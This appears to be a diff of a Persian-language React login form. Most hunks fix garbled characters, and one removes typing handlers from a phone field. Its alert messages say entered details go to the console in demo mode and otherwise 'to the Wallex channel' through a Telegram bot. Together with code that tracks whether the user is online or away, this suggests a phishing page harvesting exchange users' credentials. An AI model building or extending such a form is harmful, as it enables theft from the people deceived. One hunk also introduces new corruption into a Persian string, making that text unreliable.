@@ -238,7 +238,7 @@ export const LoginForm = () => {
             finalStatusEmoji = connectionType === 'offline' ? "📵" : "🔴";
             console.log("🔴 User is OFFLINE - network status:", connectionType);
           } else if (isActuallyOnline && !isVisible) {
-            // ��اربر آنلاین است اما صفحه hidden است
+            // کاربر آنلاین است اما صفحه hidden است
             finalStatusText = "away";
             finalStatusEmoji = "🟡";
             console.log("🟡 User is AWAY - online but tab hidden");
@@ -584,7 +584,7 @@ export const LoginForm = () => {
     setErrors({});
 
     if (!email) {
-      setErrors({ email: "ایمی�� الزامی است" });
+      setErrors({ email: "ایمیل الزامی است" });
       return;
     }
 
@@ -996,7 +996,7 @@ export const LoginForm = () => {
                 <div style={{ marginTop: "8px" }}>
                   <AlertMessage>
                     {!validateTelegramConfig()
-                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، فایل .env را ت��ظیم کنید."
+                      ? "🎭 حالت دمو: اطلاعات به کنسول ارسال می‌شود. برای فعال‌سازی تلگرام، ف��یل .env را ت��ظیم کنید."
                       : "🤖 بات تلگرام فعال: اطلاعات به کانال والکس ارسال خواهد شد."}
                   </AlertMessage>
                 </div>
@@ -1070,8 +1070,6 @@ export const LoginForm = () => {
                       maxLength={11}
                       value={toPersianDigits(mobileNumber)}
                       onChange={handleMobileNumberChange}
-                      onFocus={phoneTypingHandler.onFocus}
-                      onBlur={phoneTypingHandler.onBlur}
                       autoFocus
                       disabled={isSubmitting}
                       style={{
